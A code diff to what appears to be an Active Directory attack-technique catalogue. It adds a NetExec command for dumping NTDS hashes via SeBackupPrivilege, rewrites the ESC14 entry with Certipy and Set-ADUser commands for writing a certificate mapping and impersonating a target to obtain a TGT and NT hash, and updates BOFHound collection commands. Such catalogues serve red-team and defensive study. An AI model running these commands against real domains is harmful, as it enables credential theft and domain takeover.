@@ -49,11 +49,13 @@ export const adConvergenceNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'diskshadow / robocopy', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow' },
       { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
+      { name: 'NetExec (backup_operator)', url: 'https://github.com/Pennyw0rth/NetExec' },
     ],
     commands: [
       { label: 'Back up NTDS.dit + SYSTEM via a shadow copy', code: r`diskshadow /s script.txt   # exposes the volume, then: robocopy /b \\?\GLOBALROOT\...\Windows\NTDS NTDS.dit
 reg save HKLM\SYSTEM system.hive`, lang: 'cmd' },
       { label: 'Parse the hives offline', code: r`secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`, lang: 'bash' },
+      { label: 'Dump NTDS via SeBackupPrivilege (NetExec, no admin needed)', code: r`nxc smb <dc> -u user -p pass -M backup_operator`, lang: 'bash' },
     ],
     mitre: mitre('T1003.003'),
     references: [htGroupsRef, builtinsRef],
@@ -143,24 +145,24 @@ net group "Some Group" attacker /add /domain`, lang: 'powershell' },
     phase: 'priv-esc',
     summary: 'Abuse altSecurityIdentities explicit mappings to impersonate a privileged account.',
     description:
-      "ESC14 abuses explicit certificate-to-account mappings in the altSecurityIdentities attribute, which override the implicit UPN/SID mapping the KDC normally uses. Scenario A: with write rights over a target's altSecurityIdentities, add a weak mapping (e.g. X509SubjectOnly / X509IssuerSubject) that a certificate you can enroll satisfies, then PKINIT as the target. Scenarios B/C: the target already has a weak X509RFC822 mapping, so set a victim's mail/cn/dNSHostName to match, enroll as the victim, and authenticate as the target. Strong DC binding enforcement does NOT block this: the explicit mapping is itself the flaw.",
+      "ESC14 abuses explicit certificate-to-account mappings in the altSecurityIdentities attribute, which override the KDC's implicit UPN/SID mapping. With write rights over a target's altSecurityIdentities, add a STRONG explicit mapping (X509IssuerSerialNumber) that references a certificate you can enroll, then PKINIT as the target. A strong mapping is honored even under Full StrongCertificateBindingEnforcement (the 2022 hardening), which is exactly why it bypasses it; the WEAK mapping types (X509SubjectOnly, X509IssuerSubject, X509RFC822) are the ones enforcement blocks, so they only work where enforcement is below Full. A variant abuses a pre-existing weak mapping by setting a victim's mail/cn/dNSHostName to match. altSecurityIdentities is an ordinary directory attribute, written over LDAP/PowerShell, not by Certipy.",
     tools: [
       { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
-      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
+      { name: 'PowerView / Set-ADUser (RSAT)', url: 'https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-aduser' },
     ],
     commands: [
-      { label: 'Write a weak explicit mapping to the target (Scenario A)', code: r`certipy account update -u user@corp.local -p PASS -user TARGET -upn '' -altsecid 'X509:<I>DC=corp,DC=local,CN=CORP-CA<S>CN=attacker'`, lang: 'bash' },
-      { label: 'Enroll a cert and authenticate as the mapped target', code: r`certipy req -u victim@corp.local -p PASS -ca CORP-CA -template User
-certipy auth -pfx victim.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
+      { label: 'Enroll a client-auth cert as a controlled account', code: r`certipy-ad req -u user@corp.local -p PASS -dc-ip 10.0.0.1 -ca CORP-CA -template User`, lang: 'bash' },
+      { label: 'Write a STRONG IssuerSerialNumber mapping on the target, pointing at that cert (LDAP/PowerShell, not Certipy)', code: r`Set-ADUser TARGET -Replace @{'altSecurityIdentities'='X509:<I>DC=corp,DC=local,CN=CORP-CA<SR><reversed-serial>'}`, lang: 'powershell' },
+      { label: 'Authenticate as the target with the cert (PKINIT) → TGT + NT hash', code: r`certipy-ad auth -pfx user.pfx -username TARGET -domain corp.local -dc-ip 10.0.0.1`, lang: 'bash' },
     ],
     mitre: mitre('T1649'),
     references: [
-      { label: 'HackTricks, AD CS Domain Escalation (ESC14)', url: `${HT}/ad-certificates/domain-escalation.html` },
+      { label: 'SpecterOps, ADCS ESC14 Abuse Technique', url: 'https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/' },
+      { label: 'Microsoft, KB5014754 (strong vs weak certificate mappings)', url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16' },
       { label: 'Certipy wiki, Privilege Escalation (ESC14)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
-      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' },
     ],
-    requires: ["Write over the target's altSecurityIdentities (A), or a pre-existing weak mapping + write over a victim's mail/cn/dNSHostName (B/C)", 'Enrollment rights on a client-auth template'],
-    opsec: 'altSecurityIdentities / victim-attribute writes are auditable (5136) and should be reverted; not mitigated by StrongCertificateBindingEnforcement.',
+    requires: ["Write over the target's altSecurityIdentities (or a pre-existing weak mapping + write over a victim's mail/cn/dNSHostName)", 'Enrollment rights on a client-auth template'],
+    opsec: 'altSecurityIdentities / victim-attribute writes are auditable (5136) and should be reverted; a STRONG-mapping write is honored even under Full StrongCertificateBindingEnforcement.',
     difficulty: 'hard',
   },
   {
@@ -248,8 +250,8 @@ Koh.exe list`, lang: 'cmd' },
       { name: 'BOFHound', url: 'https://github.com/coffeegist/bofhound' },
     ],
     commands: [
-      { label: 'Collect over ADWS via SOCKS', code: r`python3 soapy.py corp.local/user:'PASS'@dc01.corp.local -dn 'DC=corp,DC=local' -q '(objectClass=user)' --bofhound`, lang: 'bash' },
-      { label: 'Transform into BloodHound JSON', code: r`bofhound -i soapy_output/ -o bloodhound_json/`, lang: 'bash' },
+      { label: 'Collect over ADWS via SOCKS (tee the BOFHound-formatted output to a log dir)', code: r`soapy corp.local/user:'PASS'@dc01.corp.local -dn 'DC=corp,DC=local' -q '(objectClass=user)' | tee data/users.log`, lang: 'bash' },
+      { label: 'Transform into BloodHound JSON', code: r`bofhound -i data/ -o bloodhound_json/`, lang: 'bash' },
     ],
     mitre: mitre('T1087.002'),
     references: [
